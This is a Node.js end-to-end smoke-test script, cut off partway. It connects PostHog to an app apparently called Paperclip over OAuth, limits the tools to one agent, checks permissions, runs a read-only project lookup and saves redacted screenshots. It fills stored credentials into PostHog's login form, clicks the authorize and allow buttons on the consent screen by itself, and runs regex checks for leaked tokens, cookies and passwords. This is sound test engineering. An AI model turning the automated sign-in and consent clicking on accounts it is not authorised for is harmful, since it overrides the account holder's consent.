#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import {
  assertSanitizedEvidence,
  extractProjectSummary,
  parsePosthogLiveArguments,
  parseSanitizedAgentProof,
  PosthogLivePreflightError,
  preflightFailureMessage,
  preparePosthogLiveSmoke,
} from "./posthog-live-lib.mjs";

const TARGET_COMPANY_PREFIX = "PAP";
const TARGET_AGENT_NAME = "CodexCoderPro";
const PROJECT_GET = "project-get";
const PROJECT_SETTINGS_UPDATE = "project-settings-update";
const EXCLUDED_PROJECT_SWITCHERS = new Set(["switch-project", "switch-organization"]);
const DEFAULT_AGENT_TIMEOUT_MS = 15 * 60_000;

class SmokeFailure extends Error {
  constructor(checkpoint, code, details = null) {
    super(`${checkpoint}:${code}`);
    this.name = "SmokeFailure";
    this.checkpoint = checkpoint;
    this.code = code;
    this.details = details;
  }
}

function fail(checkpoint, code, details = null) {
  throw new SmokeFailure(checkpoint, code, details);
}

function asArray(value, key) {
  if (Array.isArray(value)) return value;
  if (value && typeof value === "object" && Array.isArray(value[key])) return value[key];
  return [];
}

function escapeRegex(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function screenshotFile(outputDirectory, name) {
  return path.join(outputDirectory, name);
}

function safeConnectionConfig(connection, expectedProjectId) {
  const methodConfig = connection?.config?.methodConfig;
  if (!methodConfig || typeof methodConfig !== "object" || Array.isArray(methodConfig)) {
    fail("C.connection-detail", "method_config_missing");
  }
  if (connection.config?.connectionMethodKey !== "mcp-oauth") {
    fail("C.connection-detail", "oauth_method_not_recorded");
  }
  if (String(methodConfig.projectId ?? "") !== expectedProjectId) {
    fail("C.connection-detail", "wrong_project_pin");
  }
  if (methodConfig.readOnly !== false || methodConfig.mode !== "tools") {
    fail("C.connection-detail", "unexpected_posthog_scope");
  }
  if ((methodConfig.features ?? "") !== "" || (methodConfig.tools ?? "") !== "") {
    fail("C.connection-detail", "unexpected_tool_filter");
  }
  if (!connection.config?.oauth?.connectedAt) {
    fail("B.oauth-callback", "oauth_not_connected");
  }
}

function assertNoCredentialMaterial(value, secrets, checkpoint) {
  const serialized = JSON.stringify(value);
  for (const secret of secrets) {
    if (secret && serialized.includes(secret)) fail(checkpoint, "credential_material_visible");
  }
  if (/[?&](?:code|state|access_token|refresh_token)=/i.test(serialized)) {
    fail(checkpoint, "oauth_query_material_visible");
  }
  const forbiddenValueKey = /^(?:password|accessToken|access_token|refreshToken|refresh_token|oauthCode|oauth_code|clientSecret|client_secret|cookie|authorizationHeader)$/i;
  const visit = (candidate, seen = new Set()) => {
    if (!candidate || typeof candidate !== "object" || seen.has(candidate)) return;
    seen.add(candidate);
    for (const [key, child] of Object.entries(candidate)) {
      if (forbiddenValueKey.test(key) && child !== null && child !== "") {
        fail(checkpoint, "raw_credential_field_visible");
      }
      visit(child, seen);
    }
  };
  visit(value);
}

async function apiJson(request, baseUrl, method, pathname, data, checkpoint, expectedStatuses = [200]) {
  let response;
  try {
    const origin = new URL(baseUrl).origin;
    response = await request.fetch(new URL(pathname, baseUrl).toString(), {
      method,
      ...(data === undefined ? {} : { data }),
      headers: {
        accept: "application/json",
        origin,
        referer: `${origin}/`,
      },
      timeout: 30_000,
    });
  } catch {
    fail(checkpoint, "request_failed");
  }
  if (!expectedStatuses.includes(response.status())) {
    fail(checkpoint, `http_${response.status()}`);
  }
  try {
    return await response.json();
  } catch {
    fail(checkpoint, "invalid_json");
  }
}

async function waitFor(checkpoint, fn, { timeoutMs = 120_000, intervalMs = 2_000 } = {}) {
  const deadline = Date.now() + timeoutMs;
  let lastValue;
  while (Date.now() < deadline) {
    lastValue = await fn();
    if (lastValue) return lastValue;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
  fail(checkpoint, "timed_out");
  return lastValue;
}

async function expectVisible(locator, checkpoint, code, timeout = 30_000) {
  try {
    await locator.waitFor({ state: "visible", timeout });
  } catch {
    fail(checkpoint, code);
  }
}

async function gotoPaperclipPage(
  page,
  url,
  readyLocator,
  checkpoint,
  code,
  { attempts = 3, timeout = 15_000 } = {},
) {
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    try {
      await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30_000 });
      await readyLocator.waitFor({ state: "visible", timeout });
      return;
    } catch {
      if (attempt < attempts) await page.waitForTimeout(500);
    }
  }
  fail(checkpoint, code);
}

async function stabilizeCompanyContext(page, config, companyId) {
  const galleryPath = `/api/companies/${companyId}/tools/gallery`;
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    try {
      const galleryResponsePromise = page.waitForResponse(
        (response) => response.request().method() === "GET"
          && new URL(response.url()).pathname === galleryPath,
        { timeout: 30_000 },
      );
      await page.goto(new URL(`/${TARGET_COMPANY_PREFIX}/apps`, config.baseUrl).toString(), {
        waitUntil: "domcontentloaded",
        timeout: 30_000,
      });
      const response = await galleryResponsePromise;
      if (!response.ok()) continue;
      const posthogAction = page.getByRole("button", {
        name: /^(?:Connect for PostHog|Add another PostHog account)$/,
      }).first();
      await posthogAction.waitFor({ state: "visible", timeout: 30_000 });
      // The company-prefixed route and selected-company provider settle in
      // separate renders. Clicking the tile immediately can carry the prior
      // company's gallery cache into the setup effect and redirect back out.
      await page.waitForTimeout(2_000);
      return;
    } catch {
      if (attempt < 3) await page.waitForTimeout(500);
    }
  }
  fail("A.company-context", "posthog_gallery_context_missing");
}

async function openPosthogSetupFromGallery(page, config, companyId) {
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    await stabilizeCompanyContext(page, config, companyId);
    const addAnother = page.getByRole("button", { name: /^Add another PostHog account$/ }).first();
    const connect = page.getByRole("button", { name: /^Connect for PostHog$/ }).first();
    const action = await addAnother.isVisible().catch(() => false) ? addAnother : connect;
    try {
      await action.click({ timeout: 5_000 });
      await page.getByRole("button", { name: "Sign in with PostHog" }).waitFor({
        state: "visible",
        timeout: 30_000,
      });
      return;
    } catch {
      if (attempt < 3) await page.waitForTimeout(500);
    }
  }
  fail("A.setup-route", "oauth_method_missing");
}

async function safePageState(page, resourceFailures, paperclipOrigin) {
  let current;
  try {
    current = new URL(page.url());
  } catch {
    return { location: "invalid", resourceFailures };
  }
  const bodyText = await page.locator("body").innerText().catch(() => "");
  return {
    location: current.origin === paperclipOrigin
      ? `${current.hostname}${current.pathname}`
      : current.hostname,
    headingCount: await page.getByRole("heading").count().catch(() => 0),
    buttonCount: await page.getByRole("button").count().catch(() => 0),
    methodSignals: {
      posthogSignIn: /sign in with posthog/i.test(bodyText),
      personalApiKey: /personal api key/i.test(bodyText),
      connectApp: /connect an app/i.test(bodyText),
    },
    resourceFailures,
  };
}

async function clickVisibleButton(page, names) {
  for (const name of names) {
    for (const role of ["button", "link"]) {
      const control = page.getByRole(role, { name, exact: false }).filter({ visible: true }).first();
      if (await control.count()) {
        try {
          await control.click({ timeout: 2_000 });
          return true;
        } catch {
          // Provider pages often replace their form between locator creation
          // and click. The next loop re-reads the current DOM.
        }
      }
    }
  }
  return false;
}

async function selectPosthogCloudRegion(page) {
  const region = (process.env.POSTHOG_CLOUD_REGION || "us").trim().toLowerCase();
  if (!new Set(["us", "eu"]).has(region)) {
    fail("B.oauth-callback", "unsupported_cloud_region");
  }
  const expectedHost = `${region}.posthog.com`;
  const links = page.getByRole("link");
  for (let index = 0; index < await links.count(); index += 1) {
    const link = links.nth(index);
    const href = await link.getAttribute("href");
    if (!href) continue;
    try {
      const target = new URL(href, page.url());
      if (target.hostname !== expectedHost) continue;
      await page.goto(target.toString(), { waitUntil: "domcontentloaded", timeout: 30_000 });
      return true;
    } catch {
      // The provider can replace this chooser while the link is being read.
      // The next authorization-loop iteration re-evaluates it.
    }
  }
  return false;
}

async function completePosthogAuthorization(page, config) {
  const paperclipOrigin = new URL(config.baseUrl).origin;
  const providerTimeoutMs = Number(process.env.POSTHOG_PROVIDER_TIMEOUT_MS || 4 * 60_000);
  const deadline = Date.now() + (Number.isFinite(providerTimeoutMs) && providerTimeoutMs > 0
    ? providerTimeoutMs
    : 4 * 60_000);
  let providerState = null;
  let credentialFormSubmitted = false;
  while (Date.now() < deadline) {
    let current;
    try {
      current = new URL(page.url());
    } catch {
      fail("B.oauth-callback", "invalid_navigation_url");
    }
    if (current.origin === paperclipOrigin && current.pathname.includes("/apps/")) return;

    const emailInput = page.locator('input[type="email"], input[name="email"], input[autocomplete="username"]').filter({ visible: true }).first();
    const passwordInput = page.locator('input[type="password"], input[name="password"], input[autocomplete="current-password"]').filter({ visible: true }).first();
    const identityFieldVisible = await emailInput.count() > 0;
    const credentialFieldVisible = await passwordInput.count() > 0;
    const credentialForm = page.locator("form").filter({ has: passwordInput }).first();
    const submitControl = credentialForm.locator('button[type="submit"], input[type="submit"]').filter({ visible: true }).first();
    const consentControlVisible = await page.getByRole("button", {
      name: /^(?:authorize|allow|approve|grant access|accept)$/i,
    }).first().isVisible().catch(() => false);
    const bodyText = await page.locator("body").innerText().catch(() => "");
    const linkHrefs = await page.getByRole("link").evaluateAll((links) =>
      links.map((link) => link.getAttribute("href")).filter(Boolean)
    ).catch(() => []);
    const linkTargets = Array.from(new Set(linkHrefs.map((href) => {
      try {
        const target = new URL(href, current.origin);
        return `${target.hostname}${target.pathname}`;
      } catch {
        return "invalid";
      }
    })));
    providerState = {
      host: current.hostname,
      path: current.pathname.slice(0, 200),
      identityFieldVisible,
      credentialFieldVisible,
      credentialFormVisible: await credentialForm.count() > 0,
      submitControlVisible: await submitControl.count() > 0,
      submitControlDisabled: await submitControl.isDisabled().catch(() => false),
      consentControlVisible,
      alertCount: await page.getByRole("alert").count(),
      headingCount: await page.getByRole("heading").count(),
      buttonCount: await page.getByRole("button").count(),
      linkCount: await page.getByRole("link").count(),
      linkTargets,
      frameCount: page.frames().length,
      semanticSignals: {
        signIn: /\b(?:sign in|log in)\b/i.test(bodyText),
        continue: /\bcontinue\b/i.test(bodyText),
        consent: /\b(?:authorize|allow|approve|grant access|accept)\b/i.test(bodyText),
        loading: /\b(?:loading|preparing|opening|redirecting)\b/i.test(bodyText),
        workspace: /\b(?:workspace|organization|project)\b/i.test(bodyText),
        error: /\b(?:error|invalid|failed|problem|went wrong)\b/i.test(bodyText),
      },
    };
    if (current.hostname === "oauth.posthog.com" && await selectPosthogCloudRegion(page)) {
      await page.waitForTimeout(500);
      continue;
    }
    if (await emailInput.count()) {
      const currentValue = await emailInput.inputValue().catch(() => "");
      if (!currentValue) await emailInput.fill(config.email);
    }

    if (await passwordInput.count()) {
      const currentValue = await passwordInput.inputValue().catch(() => "");
      if (!currentValue) await passwordInput.fill(config.password);
      if (!credentialFormSubmitted) {
        if (await submitControl.count() && !await submitControl.isDisabled().catch(() => true)) {
          await submitControl.click({ noWaitAfter: true, timeout: 2_000 }).catch(() => {});
        } else {
          const submitted = await clickVisibleButton(page, [
            /^sign in$/i,
            /^log in$/i,
            /^login$/i,
            /^continue$/i,
            /sign in with email/i,
            /log in with email/i,
            /login with email/i,
          ]);
          if (!submitted) await passwordInput.press("Enter").catch(() => {});
        }
        credentialFormSubmitted = true;
      }
    } else if (await emailInput.count()) {
      await clickVisibleButton(page, [/^continue$/i, /^next$/i, /continue with email/i, /sign in with email/i]);
    } else {
      await clickVisibleButton(page, [
        /^authorize$/i,
        /^allow$/i,
        /^approve$/i,
        /^grant access$/i,
        /^accept$/i,
        /^continue$/i,
        /^sign in$/i,
        /^log in$/i,
      ]);
    }
    await page.waitForTimeout(500);
  }
  fail("B.oauth-callback", "provider_authorization_timed_out", { providerState });
}

async function safeScreenshot(page, outputPath, config, checkpoint) {
  const current = new URL(page.url());
  if (current.origin !== new URL(config.baseUrl).origin) fail(checkpoint, "screenshot_not_on_paperclip");
  for (const queryKey of ["code", "state", "token", "access_token", "refresh_token"]) {
    if (current.searchParams.has(queryKey)) fail(checkpoint, "credential_query_in_screenshot_url");
  }
  const bodyText = await page.locator("body").innerText();
  if (bodyText.includes(config.password) || /[?&](?:code|state|access_token|refresh_token)=/i.test(bodyText)) {
    fail(checkpoint, "credential_material_in_screenshot");
  }
  await page.screenshot({
    path: outputPath,
    fullPage: true,
    animations: "disabled",
    mask: [page.getByText(config.email, { exact: false })],
  });
}

function catalogFacts(catalog, checkpoint) {
  const active = catalog.filter((entry) => entry.status !== "removed");
  const projectGet = active.find((entry) => entry.toolName === PROJECT_GET);
  const projectSettings = active.find((entry) => entry.toolName === PROJECT_SETTINGS_UPDATE);
  if (!projectGet || !projectGet.isReadOnly) fail(checkpoint, "project_get_missing_or_not_read_only");
  if (!projectSettings || projectSettings.isReadOnly) fail(checkpoint, "project_settings_update_missing_or_not_write");
  for (const excluded of EXCLUDED_PROJECT_SWITCHERS) {
    if (active.some((entry) => entry.toolName === excluded)) fail(checkpoint, `excluded_${excluded}_present`);
  }
  return { active, projectGet, projectSettings };
}

async function finishAgentOnlySetup(request, config, companyId, connectionId, catalog, agentId) {
  const { active } = catalogFacts(catalog, "C.catalog-policy");
  const enabledCatalogEntryIds = active.filter((entry) => entry.isReadOnly).map((entry) => entry.id);
  await apiJson(
    request,
    config.baseUrl,
    "POST",
    `/api/companies/${companyId}/tools/apps/${connectionId}/finish`,
    {
      enabledCatalogEntryIds,
      askFirstCatalogEntryIds: [],
      reviewedCatalogEntryIds: active.filter((entry) => entry.status === "quarantined").map((entry) => entry.id),
      access: { agentIds: [agentId] },
    },
    "C.catalog-policy",
  );
  await apiJson(
    request,
    config.baseUrl,
    "PUT",
    `/api/tool-connections/${connectionId}/installs`,
    { installs: [{ targetType: "agent", targetId: agentId }] },
    "C.agent-install",
  );
}

async function findConnectionIdByName(request, config, companyId, connectionName) {
  const connectionsResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/connections`,
    undefined,
    "F.cleanup-recovery",
  );
  const matching = asArray(connectionsResponse, "connections").filter(
    (connection) => connection.name === connectionName && connection.status !== "archived",
  );
  if (matching.length > 1) fail("F.cleanup-recovery", "duplicate_test_connections");
  return matching[0]?.id ?? null;
}

async function cleanupConnection(
  request,
  config,
  companyId,
  connectionId,
  connectionName,
  { requireInstalledState = true } = {},
) {
  const removed = await apiJson(
    request,
    config.baseUrl,
    "DELETE",
    `/api/tool-connections/${connectionId}`,
    undefined,
    "F.cleanup",
  );
  const receipt = removed.removal;
  if (!receipt || (requireInstalledState && (
    receipt.installsRemoved < 1
    || receipt.appProfileBindingsRemoved < 1
    || receipt.credentialRefsCleared + receipt.secretsRevoked < 1
    || !["deleted", "archived"].includes(receipt.appProfile)
  ))) {
    fail("F.cleanup", "incomplete_removal_receipt");
  }

  const connectionsResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/connections`,
    undefined,
    "F.cleanup-verification",
  );
  const remaining = asArray(connectionsResponse, "connections").filter(
    (connection) => connection.name === connectionName && connection.status !== "archived",
  );
  if (remaining.length > 0) fail("F.cleanup-verification", "test_connection_remains");

  const profilesResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/profiles`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(profilesResponse, "profiles").some((profile) => profile.profileKey === `app:${connectionId}` && profile.status === "active")) {
    fail("F.cleanup-verification", "active_profile_remains");
  }
  const pendingResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/action-requests?status=pending`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(pendingResponse, "actionRequests").some((item) => (item.connectionId ?? item.request?.connectionId) === connectionId)) {
    fail("F.cleanup-verification", "pending_action_remains");
  }
  return {
    credentialsTornDown: receipt.credentialRefsCleared + receipt.secretsRevoked > 0,
    accessBindingsRemoved: receipt.appProfileBindingsRemoved,
    installsRemoved: receipt.installsRemoved,
    appProfile: receipt.appProfile,
    pendingActions: 0,
    remainingConnections: 0,
  };
}

async function runSmoke({ config, chromium }) {
  const startedAt = new Date();
  const runKey = startedAt.toISOString().replace(/[:.]/g, "-");
  const connectionName = `PostHog live self-test ${startedAt.toISOString()}`;
  const outputDirectory = process.env.POSTHOG_EVIDENCE_DIR
    ? path.resolve(process.env.POSTHOG_EVIDENCE_DIR)
    : path.join(process.env.PAPERCLIP_RUN_SCRATCH_DIR || process.cwd(), `posthog-live-${runKey}`);
  await mkdir(outputDirectory, { recursive: true });

  const summary = {
    schemaVersion: 1,
    smoke: "posthog_mcp_live",
    passed: false,
    startedAt: startedAt.toISOString(),
    completedAt: null,
    target: { companyPrefix: TARGET_COMPANY_PREFIX, projectId: config.projectId },
    connection: null,
    catalog: null,
    boardTest: null,
    freshRun: null,
    cleanup: null,
    screenshots: [],
    failure: null,
  };

  let browser;
  let context;
  let page;
  let connectionId = null;
  let companyId = null;
  let cleanupComplete = false;
  let caughtFailure = null;
  let activeCheckpoint = "A.browser-launch";
  const resourceFailures = [];

  try {
    browser = await chromium.launch({ headless: process.env.POSTHOG_SMOKE_HEADED !== "1" });
    context = await browser.newContext({
      viewport: { width: 1440, height: 1000 },
      acceptDownloads: false,
      serviceWorkers: "block",
    });
    page = await context.newPage();
    page.on("requestfailed", (request) => {
      if (!["document", "script", "stylesheet", "xhr", "fetch"].includes(request.resourceType())) return;
      try {
        const target = new URL(request.url());
        if (target.origin !== new URL(config.baseUrl).origin) return;
        resourceFailures.push({
          target: `${target.hostname}${target.pathname}`,
          resourceType: request.resourceType(),
          error: request.failure()?.errorText ?? "unknown",
        });
        if (resourceFailures.length > 12) resourceFailures.shift();
      } catch {
        // Ignore malformed resource URLs rather than copying them into evidence.
      }
    });

    activeCheckpoint = "A.paperclip-login";
    await gotoPaperclipPage(
      page,
      new URL("/auth?next=/", config.baseUrl).toString(),
      page.locator("#email"),
      "A.paperclip-login",
      "email_field_missing",
    );
    await page.locator("#email").fill(config.email);
    await page.locator("#password").fill(config.password);
    const loginResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST" && new URL(response.url()).pathname === "/api/auth/sign-in/email",
    );
    await page.getByRole("button", { name: /^sign in$/i }).click();
    const loginResponse = await loginResponsePromise;
    if (!loginResponse.ok()) fail("A.paperclip-login", `http_${loginResponse.status()}`);
    await page.waitForURL((url) => url.pathname !== "/auth", { timeout: 30_000 }).catch(() => {
      fail("A.paperclip-login", "login_redirect_missing");
    });

    activeCheckpoint = "A.company-selection";
    const companiesResponse = await apiJson(context.request, config.baseUrl, "GET", "/api/companies", undefined, "A.company-selection");
    const company = asArray(companiesResponse, "companies").find((candidate) => candidate.issuePrefix === TARGET_COMPANY_PREFIX);
    if (!company) fail("A.company-selection", "pap_company_missing");
    companyId = company.id;

    activeCheckpoint = "C.agent-scope";
    const agentsResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/companies/${companyId}/agents`,
      undefined,
      "C.agent-scope",
    );
    const agent = asArray(agentsResponse, "agents").find((candidate) => candidate.name === TARGET_AGENT_NAME);
    if (!agent) fail("C.agent-scope", "codex_coder_pro_missing");

    activeCheckpoint = "A.setup-route";
    await openPosthogSetupFromGallery(page, config, companyId);
    await expectVisible(page.getByRole("button", { name: "Use a personal API key" }), "A.setup-route", "api_key_method_missing");

    activeCheckpoint = "B.oauth-setup";
    await page.getByRole("button", { name: "Sign in with PostHog" }).click();
    const nameInput = page.locator('input[placeholder="My app"]');
    await nameInput.fill(connectionName);
    await page.locator('input[placeholder="12345"]').fill(config.projectId);
    const readOnlyScope = page.locator("div").filter({ hasText: /^Read-only mode/ }).filter({ has: page.getByRole("switch") }).first();
    const readOnlySwitch = readOnlyScope.getByRole("switch");
    if (await readOnlySwitch.getAttribute("aria-checked") !== "false") fail("B.oauth-setup", "read_only_default_changed");
    await page.getByText("Advanced", { exact: true }).click();
    const featuresInput = page.locator("label", { hasText: "Feature groups" }).locator("..").locator("textarea");
    const toolsInput = page.locator("label", { hasText: "Individual tools" }).locator("..").locator("textarea");
    if (await featuresInput.inputValue() !== "" || await toolsInput.inputValue() !== "") {
      fail("B.oauth-setup", "tool_filters_not_blank");
    }
    const responseMode = page.locator("label", { hasText: "Tool response mode" }).locator("..").locator("select");
    if (await responseMode.inputValue() !== "tools") fail("B.oauth-setup", "individual_tools_mode_not_selected");

    activeCheckpoint = "B.oauth-start";
    const connectResponsePromise = page.waitForResponse(
      (response) => {
        const target = new URL(response.url());
        return response.request().method() === "POST"
          && target.pathname === `/api/companies/${companyId}/tools/apps/connect`;
      },
      { timeout: 120_000 },
    );
    await page.getByRole("button", { name: "Continue to sign in" }).click({ noWaitAfter: true });
    const connectResponse = await connectResponsePromise;
    if (!connectResponse.ok()) fail("B.oauth-start", `http_${connectResponse.status()}`);
    let connectResult = null;
    try {
      connectResult = await connectResponse.json();
    } catch {
      // A successful create immediately redirects the page to PostHog. Chromium
      // can discard that response body during the cross-origin navigation, so
      // recover the uniquely named draft instead of orphaning it.
    }
    connectionId = connectResult?.connectionId ?? await waitFor(
      "B.oauth-start",
      () => findConnectionIdByName(context.request, config, companyId, connectionName),
      { timeoutMs: 15_000, intervalMs: 500 },
    );
    if (typeof connectionId !== "string" || !connectionId) fail("B.oauth-start", "connection_id_missing");

    activeCheckpoint = "B.oauth-callback";
    await completePosthogAuthorization(page, config);
    const permissionsPath = `/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/permissions`;
    await gotoPaperclipPage(
      page,
      new URL(permissionsPath, config.baseUrl).toString(),
      page.getByText("PostHog connected", { exact: true }),
      "B.oauth-callback",
      "connected_state_missing",
      { attempts: 3, timeout: 30_000 },
    );

    activeCheckpoint = "C.connection-detail";
    let connection = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}`,
      undefined,
      "C.connection-detail",
    );
    safeConnectionConfig(connection, config.projectId);
    assertNoCredentialMaterial(connection, [config.password], "C.connection-detail");
    summary.connection = {
      id: connectionId,
      name: connectionName,
      authentication: "oauth",
      projectId: config.projectId,
      status: connection.status,
      healthStatus: connection.healthStatus,
    };
    const connectedShot = "01-connected-setup.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, connectedShot), config, "F.connected-screenshot");
    summary.screenshots.push(connectedShot);

    activeCheckpoint = "C.catalog-policy";
    let catalogResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}/catalog`,
      undefined,
      "C.catalog-policy",
    );
    let catalog = asArray(catalogResponse, "catalog");
    let facts = catalogFacts(catalog, "C.catalog-policy");
    await finishAgentOnlySetup(context.request, config, companyId, connectionId, catalog, agent.id);

    const health = await apiJson(
      context.request,
      config.baseUrl,
      "POST",
      `/api/tool-connections/${connectionId}/health-check`,
      {},
      "C.health-check",
    );
    if (health.connection?.healthStatus !== "healthy") fail("C.health-check", "connection_not_healthy");
    const refreshed = await apiJson(
      context.request,
      config.baseUrl,
      "POST",
      `/api/tool-connections/${connectionId}/catalog/refresh`,
      {},
      "C.catalog-refresh",
    );
    catalog = asArray(refreshed, "catalog");
    facts = catalogFacts(catalog, "C.catalog-refresh");
    await finishAgentOnlySetup(context.request, config, companyId, connectionId, catalog, agent.id);

    connection = await apiJson(context.request, config.baseUrl, "GET", `/api/tool-connections/${connectionId}`, undefined, "C.connection-detail");
    safeConnectionConfig(connection, config.projectId);
    if (connection.status !== "active" || connection.healthStatus !== "healthy") {
      fail("C.connection-detail", "connection_not_active_and_healthy");
    }
    assertNoCredentialMaterial(connection, [config.password], "C.connection-detail");
    summary.connection.status = connection.status;
    summary.connection.healthStatus = connection.healthStatus;

    const uniqueConnections = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/companies/${companyId}/tools/connections`,
      undefined,
      "C.connection-detail",
    );
    if (asArray(uniqueConnections, "connections").filter((candidate) => candidate.name === connectionName).length !== 1) {
      fail("C.connection-detail", "duplicate_connection_detected");
    }

    const installs = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}/installs`,
      undefined,
      "C.agent-install",
    );
    const installRows = asArray(installs, "installs");
    if (installRows.length !== 1 || installRows[0].targetType !== "agent" || installRows[0].targetId !== agent.id) {
      fail("C.agent-install", "install_not_agent_only");
    }

    const testAgents = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}/test-agents`,
      undefined,
      "C.effective-policy",
    );
    const testAgent = asArray(testAgents, "agents").find((candidate) => candidate.id === agent.id);
    const projectGetAccess = testAgent?.effectiveAccess?.tools?.find((tool) => tool.toolName === PROJECT_GET);
    const projectSettingsAccess = testAgent?.effectiveAccess?.tools?.find((tool) => tool.toolName === PROJECT_SETTINGS_UPDATE);
    if (projectGetAccess?.decision !== "allowed" || projectSettingsAccess?.decision !== "off") {
      fail("C.effective-policy", "unexpected_effective_decision");
    }
    summary.catalog = {
      discoveredCount: refreshed.discoveredCount,
      projectGet: { catalogEntryId: facts.projectGet.id, toolName: PROJECT_GET, decision: "allowed" },
      projectSettingsUpdate: { catalogEntryId: facts.projectSettings.id, toolName: PROJECT_SETTINGS_UPDATE, decision: "off" },
      excludedToolsAbsent: [...EXCLUDED_PROJECT_SWITCHERS],
      accessAgentId: agent.id,
      installAgentId: agent.id,
      healthCheck: "healthy",
      catalogRefresh: "succeeded",
    };

    activeCheckpoint = "C.permissions-ui";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/permissions`, config.baseUrl).toString(),
      page.getByText("Who can use it", { exact: true }),
      "C.permissions-ui",
      "permissions_panel_missing",
    );
    const projectGetPermission = page.locator(`[data-action-id="${facts.projectGet.id}"] select`);
    const projectSettingsPermission = page.locator(`[data-action-id="${facts.projectSettings.id}"] select`);
    await expectVisible(projectGetPermission, "C.permissions-ui", "project_get_permission_missing");
    await expectVisible(projectSettingsPermission, "C.permissions-ui", "project_settings_permission_missing");
    if (await projectGetPermission.inputValue() !== "allowed" || await projectSettingsPermission.inputValue() !== "off") {
      fail("C.permissions-ui", "permissions_ui_mismatch");
    }
    const permissionsShot = "02-scoped-permissions.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, permissionsShot), config, "F.permissions-screenshot");
    summary.screenshots.push(permissionsShot);

    activeCheckpoint = "D.test-panel";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/test`, config.baseUrl).toString(),
      page.getByLabel("Choose which agent to test as"),
      "D.test-panel",
      "agent_picker_missing",
    );
    await page.getByLabel("Choose which agent to test as").click();
    await page.getByLabel("Search agents").fill(TARGET_AGENT_NAME);
    await page.getByRole("button", { name: new RegExp(`^${escapeRegex(TARGET_AGENT_NAME)}`) }).click();
    await page.getByLabel("Find an action").fill(PROJECT_GET);
    const projectGetTitle = facts.projectGet.title ?? facts.projectGet.toolName;
    const actionRow = page.locator("button").filter({ hasText: projectGetTitle }).filter({ hasText: "Allowed" }).first();
    await expectVisible(actionRow, "D.test-panel", "project_get_allowed_row_missing");
    await actionRow.click();
    await expectVisible(page.getByText("This action takes no inputs."), "D.test-panel", "empty_input_form_missing");

    activeCheckpoint = "D.project-get";
    const boardTestStartedAt = Date.now();
    const testCallResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST"
      && new URL(response.url()).pathname === `/api/tool-connections/${connectionId}/test-calls`,
    );
    await page.getByRole("button", { name: /^run$/i }).click();
    const testCallResponse = await testCallResponsePromise;
    if (!testCallResponse.ok()) fail("D.project-get", `http_${testCallResponse.status()}`);
    let testCall;
    try {
      testCall = await testCallResponse.json();
    } catch {
      fail("D.project-get", "invalid_json");
    }
    let testCallInput;
    try {
      testCallInput = testCallResponse.request().postDataJSON();
    } catch {
      fail("D.project-get", "request_body_unavailable");
    }
    if (testCallInput?.agentId !== agent.id
      || testCallInput?.toolName !== PROJECT_GET
      || !testCallInput.parameters
      || typeof testCallInput.parameters !== "object"
      || Array.isArray(testCallInput.parameters)
      || Object.keys(testCallInput.parameters).length !== 0) {
      fail("D.project-get", "nonempty_or_unexpected_input");
    }
    if (testCall.decision !== "allowed" || testCall.error || typeof testCall.invocationId !== "string") {
      fail("D.project-get", "gateway_call_not_allowed");
    }
    const boardProject = extractProjectSummary(testCall.result, config.projectId);
    if (!boardProject?.name) fail("D.project-get", "project_result_missing");
    await expectVisible(page.getByText(/^Worked\./), "D.project-get", "success_result_missing");
    const boardShot = "03-board-project-get.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, boardShot), config, "F.board-test-screenshot");
    summary.screenshots.push(boardShot);
    summary.boardTest = {
      catalogEntryId: facts.projectGet.id,
      toolName: PROJECT_GET,
      invocationId: testCall.invocationId,
      decision: testCall.decision,
      httpStatus: testCallResponse.status(),
      resultStatus: "succeeded",
      project: boardProject,
      durationMs: Date.now() - boardTestStartedAt,
    };

    activeCheckpoint = "E.create-proof-issue";
    const parentIssueId = process.env.POSTHOG_PROOF_PARENT_ISSUE_ID || process.env.PAPERCLIP_TASK_ID;
    if (!parentIssueId) fail("E.create-proof-issue", "parent_issue_id_missing");
    const child = await apiJson(
      context.request,
      config.baseUrl,
      "POST",
      `/api/issues/${parentIssueId}/children`,
      {
        title: `PostHog installed-tool proof ${startedAt.toISOString()}`,
        description: [
          "Invoke exactly one installed PostHog action: the read-only upstream `project-get` tool, with an empty `{}` input.",
          `Verify the returned project ID is exactly ${config.projectId} and make no PostHog mutations.`,
          "Then post exactly one JSON object with keys `projectId`, `projectName`, and `invocationId` (the Paperclip invocation ID), and mark this issue done.",
          "Do not report tokens, cookies, authorization data, request headers, raw tool payloads, or any other fields.",
        ].join("\n\n"),
        status: "todo",
        workMode: "standard",
        priority: "medium",
        assigneeAgentId: agent.id,
        acceptanceCriteria: [
